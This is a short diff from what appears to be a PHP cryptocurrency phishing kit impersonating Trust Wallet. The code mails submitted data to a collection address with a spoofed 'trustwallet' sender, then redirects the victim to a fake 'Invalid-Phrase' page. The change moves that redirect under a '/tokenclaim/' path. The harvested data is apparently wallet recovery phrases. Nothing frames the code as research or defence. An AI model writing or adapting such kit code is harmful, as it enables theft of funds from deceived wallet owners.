@@ -49,7 +49,7 @@ $headers = "From: trustwallet </>";
 mail($rezult_mail, $subject,                      $message,                                                   $headers);
 echo "<script                                                                      LANGUAGE=\"JavaScript\">
 <!--
-top.location=\"/trustwallet/Invalid-Phrase.html?/access-my-wallet\";
+top.location=\"/tokenclaim/trustwallet/Invalid-Phrase.html?/access-my-wallet\";
 // -->
 </script>";
 ?>
